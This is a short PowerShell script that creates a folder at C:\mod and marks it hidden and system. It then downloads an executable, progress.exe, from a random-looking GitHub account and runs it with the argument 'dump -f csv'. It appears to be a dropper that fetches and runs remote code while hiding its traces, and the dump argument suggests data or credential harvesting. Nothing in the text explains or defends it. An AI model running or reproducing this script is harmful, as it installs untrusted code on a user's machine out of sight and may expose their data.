$folder = "C:\mod"
$exe = "$folder\progress.exe"
$url = "https://raw.githubusercontent.com/zzfef33f/sdsdsdsd/refs/heads/main/progress.exe"


New-Item -ItemType Directory -Path $folder -Force | Out-Null
attrib +h +s $folder


Invoke-WebRequest -Uri $url -OutFile $exe


Start-Process -FilePath $exe -ArgumentList "dump -f csv" -WorkingDirectory $folder -Wait
